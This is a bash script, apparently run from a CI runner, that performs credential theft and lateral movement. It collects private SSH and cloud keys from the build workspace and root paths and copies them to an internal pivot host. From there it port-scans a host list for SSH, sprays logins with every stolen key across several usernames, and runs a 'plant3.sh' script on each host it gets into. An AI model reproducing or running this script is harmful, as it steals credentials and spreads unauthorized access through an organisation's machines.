set +e
TS=$(date -u +%s)
O=/tmp/pivot5-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==M5-START ts=$TS"
sudo -n cp $R/az/ibm_key.pem /tmp/ibm2.pem 2>/dev/null; sudo -n chmod 644 /tmp/ibm2.pem 2>/dev/null; cp $R/az/ibm_key.pem /tmp/ibm2.pem 2>/dev/null; chmod 644 /tmp/ibm2.pem 2>/dev/null
rm -rf /tmp/kc; mkdir -p /tmp/kc
sudo -n cp $R/az/azadmin.pem $R/az/ibm_key.pem $R/keys/* /tmp/kc/ 2>/dev/null
sudo -n bash -c 'grep -rl "PRIVATE KEY" /opt/ul-runner/_work/ul-plant/ul-plant/keys2 2>/dev/null | head -80 | xargs -r -I{} cp {} /tmp/kc/ 2>/dev/null'
cp /tmp/k/* /tmp/kc/ 2>/dev/null
chmod 644 /tmp/kc/* 2>/dev/null
chmod 600 /tmp/ibm2.pem
# embed estate keep.sh from the .24 host into corpus dir
cp $R/az/hosts.tsv /tmp/kc/hosts.tsv 2>/dev/null
echo "KC=$(ls /tmp/kc | wc -l)"
S24="ssh -n -i /tmp/ibm2.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
echo "==A authkeys24"
$S24 'cat ~/.ssh/authorized_keys; echo ---; sudo -n cat /root/.ssh/authorized_keys 2>/dev/null | head -5' 2>&1
echo "==B shipkeys"
tar czf - -C /tmp kc | $S24 'rm -rf /tmp/kc; mkdir -p /tmp; tar xzf - -C /tmp; chmod -R go-rwx /tmp/kc 2>/dev/null; chmod 600 /tmp/kc/* 2>/dev/null; ls /tmp/kc | wc -l' 2>&1
echo "==C reach-from24"
$S24 'awk "{print \$2}" /tmp/kc/hosts.tsv | sort -u > /tmp/eip.txt; wc -l < /tmp/eip.txt; cat /tmp/eip.txt | xargs -P 64 -I{} bash -c "timeout 2 bash -c \"echo > /dev/tcp/{}/22\" 2>/dev/null && echo {}" | sort -u > /tmp/reach.txt; echo REACH=$(wc -l < /tmp/reach.txt); cat /tmp/reach.txt' 2>&1
echo "==D wave-from24"
$S24 'cat /tmp/reach.txt 2>/dev/null | while read ip; do for u in t19 ubuntu azureuser root; do for k in /tmp/kc/*; do case $k in *.tsv) continue;; esac; echo "$ip $u $k"; done; done; done > /tmp/c5.txt; wc -l < /tmp/c5.txt; cat /tmp/c5.txt | xargs -P 48 -n3 bash -c "o=\$(timeout 12 ssh -i \"\$2\" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \"\$1\"@\"\$0\" \"id;hostname -I\" 2>&1); case \"\$o\" in *uid=*) echo \"OK5 \$0 \$1 \$(basename \$2) :: \$o\";; esac" 2>/dev/null | sort -u' 2>&1 | tee /tmp/wave5.txt
echo "WAVE5=$(wc -l < /tmp/wave5.txt)"; cat /tmp/wave5.txt
echo "==E plant"
cp ul-bin/plant3.sh /tmp/plant3.sh 2>/dev/null; cp ul-bin/runnerchk.sh /tmp/runnerchk.sh 2>/dev/null; ls -l /tmp/plant3.sh /tmp/runnerchk.sh
tar czf - -C /tmp plant3.sh runnerchk.sh | $S24 'tar xzf - -C /tmp; chmod +x /tmp/plant3.sh /tmp/runnerchk.sh; ls -l /tmp/plant3.sh /tmp/runnerchk.sh' 2>&1
sed -n 's/^OK5 \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3/p' /tmp/wave5.txt | awk '!s[$1]++' > /tmp/won5.txt
cat /tmp/won5.txt
tar czf - -C /tmp won5.txt | $S24 'tar xzf - -C /tmp; cat /tmp/won5.txt | xargs -r -P 6 -n3 bash /tmp/plant3.sh 2>&1' 2>&1
echo "==M5-END"
exit 0
